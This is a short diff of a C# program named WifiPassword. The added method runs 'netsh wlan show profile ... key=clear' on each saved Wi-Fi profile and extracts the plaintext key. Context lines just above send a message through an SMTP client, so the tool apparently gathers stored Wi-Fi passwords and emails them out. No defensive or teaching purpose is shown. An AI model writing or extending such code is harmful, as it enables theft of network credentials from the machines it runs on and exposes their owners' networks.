@@ -55,6 +55,10 @@ namespace WifiPassword
             smtpClient.Send(message);
         }
 
+        private static string[] GetWifiPasswords(string[] profiles)
+            {
+            var passwords = new string[profiles.Length];
+            
         for (int i = 0; i < profiles.Length; i++)
             {
                 var output = RunCommand("netsh", $"wlan show profile \"{profiles[i]}\" key=clear");
@@ -65,6 +69,9 @@ namespace WifiPassword
                     passwords[i] = passwordLine.Trim().Replace("Key Content            : ", "");
                 }
             }
+            
+                 return passwords;
+        }
 
             private static string[] GetProfiles()
             {
